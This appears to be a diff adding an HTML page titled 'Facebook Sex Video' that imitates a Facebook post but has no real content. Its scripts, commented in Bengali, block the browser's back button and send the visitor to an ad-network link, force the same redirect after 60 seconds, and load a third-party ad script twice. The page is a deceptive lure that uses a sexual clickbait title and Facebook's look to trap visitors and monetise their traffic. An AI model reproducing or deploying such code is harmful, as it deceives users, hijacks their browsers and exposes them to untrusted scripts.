@@ -1,1 +1,258 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8"></meta>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"></meta>
+    <title>Facebook Sex Video</title>
+    <link href="styles.css" rel="stylesheet"></link>
+    <script crossorigin="anonymous" src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <script async="" crossorigin="anonymous" defer="" nonce="LFG6Ed3M" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v13.0"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+      
+      .username {
+    color: black;
+    text-decoration: none; /* Removes the underline */
+}
 
+        .facebook-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #1877f2;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            max-width: 500px;
+            margin: auto;
+            border-radius: 10px 10px 0 0;
+        }
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+        .icons button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 18px;
+            margin-left: 10px;
+            cursor: pointer;
+        }
+        .nav-icons {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            padding: 10px 0;
+            background-color: white;
+            border-radius: 0 0 10px 10px;
+        }
+        .nav-icons button {
+            background: none;
+            border: none;
+            color: black;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .nav-icons .home,
+        .nav-icons .video,
+        .nav-icons .group {
+            color: #1877f2;
+        }
+        .post-container {
+            background-color: white;
+            width: 100%;
+            max-width: 500px;
+            margin: auto;
+            padding: 15px;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .post-header {
+            display: flex;
+            align-items: center;
+        }
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .post-text {
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .post-image-link img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .post-footer {
+            display: flex;
+            justify-content: space-between;
+            padding-top: 20px;
+            font-size: 14px;
+            color: gray;
+        }
+        .post-footer div {
+            display: flex;
+            align-items: center;
+        }
+        .post-footer i {
+            font-size: 16px;
+            margin-right: 5px;
+        }
+        .post-footer span {
+            font-size: 14px;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .user-name-time {
+            display: flex;
+            align-items: center;
+        }
+        .follow-button {
+            background-color: white;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            padding: 5px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-left: 10px;
+        }
+        .follow-button:hover {
+            background-color: #e7f3ff;
+        }
+        .whats-on-your-mind-container {
+            display: flex;
+            align-items: center;
+            background-color: white;
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .whats-on-your-mind-container img {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .whats-on-your-mind-container input {
+            border: none;
+            width: 100%;
+            font-size: 14px;
+            color: black;
+            background-color: #f0f2f5;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .whats-on-your-mind-container input:focus {
+            outline: none;
+            background-color: #fff;
+        }
+        .whats-on-your-mind-container .icon-container {
+            margin-left: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .whats-on-your-mind-container .icon-container i {
+            font-size: 20px;
+            color: #1877f2;
+        }
+
+        .reactions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            color: black;
+        }
+
+        .reaction-countlove {
+            font-size: 14px;
+        }
+
+        .reaction-options {
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .reaction-count {
+            white-space: nowrap;
+            display: inline-flex;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .user-name {
+            font-size: 14px;
+            color: #000;
+        }
+
+        /* Share Button Styling */
+        .share-button {
+            background-color: black;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .share-button.clicked {
+            background-color: green;
+        }
+
+    </style>
+  
+  <script>
+    (function() {
+        // প্রথমে ব্যাক বাটন ব্লক করার জন্য স্টেট পুশ করা হবে
+        window.history.pushState(null, null, window.location.href);
+        
+        window.onpopstate = function() {
+            // ইউজার ব্যাক বাটনে ক্লিক করলে এড পেজে পাঠানো হবে
+            window.location.href = "https://www.profitableratecpm.com/u6phx6kx?key=6c2d07d4cc84c2d43fcdcaaea1d1b912"; // এখানে আপনার বিজ্ঞাপনের লিংক দিন
+        };
+    })();
+</script>
+
+  
+  
+  <!--Redirect a ad after 60 secound-->
+  <script>
+    setTimeout(function() {
+        window.location.href = "https://www.profitableratecpm.com/u6phx6kx?key=6c2d07d4cc84c2d43fcdcaaea1d1b912"; // এখানে আপনার বিজ্ঞাপনের লিংক দিন
+    }, 60000); // 6০ সেকেন্ড (6০,০০০ মিলিসেকেন্ড)
+</script>
+
+</head>
+<body>
+  
+  <!--social bar ads-->
+  <script type='text/javascript' src='//pl25725078.profitableratecpm.com/d0/34/46/d034463ebde797aff9c3d89a2bb0f52e.js'></script>
+  
+   <!--social bar ads-->
+   <script type='text/javascript' src='//pl25725078.profitableratecpm.com/d0/34/46/d034463ebde797aff9c3d89a2bb0f52e.js'></script>
+
+  
+  
+</body>
+</html>
